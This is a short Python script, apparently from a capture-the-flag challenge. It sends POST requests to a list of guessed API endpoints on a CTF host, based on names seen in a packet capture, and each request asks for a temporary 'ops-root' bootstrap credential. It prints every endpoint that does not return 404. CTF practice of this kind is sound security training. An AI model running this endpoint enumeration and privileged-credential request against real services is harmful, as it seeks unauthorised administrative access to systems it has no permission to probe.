"""
The pcap shows POST /ddddddtestStat as the ticket-generation endpoint.
This might be obfuscated/redacted. Let's try variations and the
internal endpoint patterns seen in the pcap.
"""
import requests
import json

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

# Variations of the endpoint seen in pcap
endpoints = [
    "/ddddddtestStat",
    "/testStat",
    "/api/auth/ticket", 
    "/api/auth/bootstrap",
    "/api/session/bootstrap",
    "/api/admin/bootstrap",
    "/api/admin/ticket",
    "/api/ops/bootstrap",
    "/api/ops/ticket",
    "/api/legacy/bootstrap",
    "/api/legacy/ticket",
    "/api/internal/bootstrap",
    "/api/internal/ticket",
    "/api/session/admin",
    "/api/auth/login",
    "/api/auth/admin",
    "/stat",
    "/teststat",
    "/test-stat",
    "/api/stat",
    "/api/test",
    "/api/testStat",
    "/api/test/stat",
]

payload = {"principal": "ops-root", "mode": "bootstrap", "credentialType": "temporary"}

for ep in endpoints:
    r = requests.post(f"{base}{ep}", json=payload, headers={"Content-Type": "application/json", "Accept": "application/json"})
    if r.status_code != 404:
        print(f"FOUND: {ep} -> {r.status_code} {r.text[:200]}")
    else:
        print(f"  404: {ep}")
